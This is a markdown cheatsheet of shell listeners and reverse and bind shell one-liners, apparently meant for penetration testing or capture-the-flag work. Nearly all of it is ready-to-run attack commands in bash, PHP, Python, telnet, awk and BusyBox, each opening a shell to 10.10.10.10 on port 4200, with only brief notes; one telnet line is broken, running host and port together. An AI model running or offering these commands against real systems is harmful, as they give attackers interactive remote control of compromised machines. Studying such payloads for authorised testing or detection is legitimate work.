# Cheatsheet

## Listeners
```sh
nc -lvnp 4200
rlwrap nc -lvnp 4200
ncat -lvnp 4200
ncat --ssl -lvnp 4200
socat -d -d TCP-LISTEN:443 STDOUT
```

## Reverse Shells
Connection initiates from victim to attacker machine.

### Pipe reverse shell:
| Command | Description |
| ------- | ----------- |
| `rm -f /tmp/f` | Removes existing pipe file. Prevents conflicts. |
| `mkfifo /tmp/f` | Named pipe for 2-way communication between processes. |
| `cat /tmp/f` | Read data from named pipe. Waits for input. |
| `bash -i 2>&1` | pipe to bash interactively, redirect all stderr to stdout so that attacker receives all output. |
| `nc 10.10.10.10 4200 > /tmp/f` | Pipe output through `nc` |
| `>/tmp/f` | Sends output of commands back to the named pipe |

```sh
rm -f /tmp/f;mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.10.10 4200 > /tmp/f
```

## Bind Shells
- Bind a port on victim system and listen for a connection.
- Ideal when host does not allow outgoing connections.
- Needs to remain active to receive connections.
- Detectable.

```sh
rm -f /tmp/f;mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 4200 > /tmp/f
```

From the attacking machine:
```sh
nc -nv 10.10.10.10 4200
```

## Normal Bash Reverse Shell
```sh
bash -i >& /dev/tcp/10.10.10.10/4200 0>&1
```

## Read-Line 
Create a new file descriptor `5` and pipes output.
```sh
exec 5<> /dev/tcp/10.10.10.10/4200; cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Bash file descriptor 196 reverse shell
Create a new file descriptor `196` and pipes output.
```sh
0<&196;exec 196<>/dev/tcp/10.10.10.10/4200; sh <&196 >&196 2>&196
```

## Bash file descriptor 5 reverse shell
Open shell with `bash -i` and uses descriptor `5`
```sh
bash -i 5<> /dev/tcp/10.10.10.10/4200 0<&5 1>&5 2>&5
```

## PHP 
```php
php -r '$sock=fsockopen("10.10.10.10", 4200);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10", 4200);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10", 4200);system("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10", 4200);passthru("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10", 4200);popen("sh <&3 >&3 2>&3","r");'
```

## Pyhon
Exporting env variables:
```py
export RHOST="10.10.10.10";
export RPORT=443;
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

Subprocess
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4200));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

Reverse Shell
```py
python -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",4200));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'
```

## Telnet
```sh
TF=$(mktemp -u); mkfifo $TF && telnet 10.10.10.104200 0<$TF | sh 1>$TF
```

## AWK
```sh
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4200";while(42) { do{ printf "shell>" | & s; s | & getline c; if(c){while((c | & getline) > 0) print $0 | & s; close(c); }} while(c != "exit") close(s); }}'
```

## BusyBox
```sh
busybox nc 10.10.10.10 4200 -e sh
```
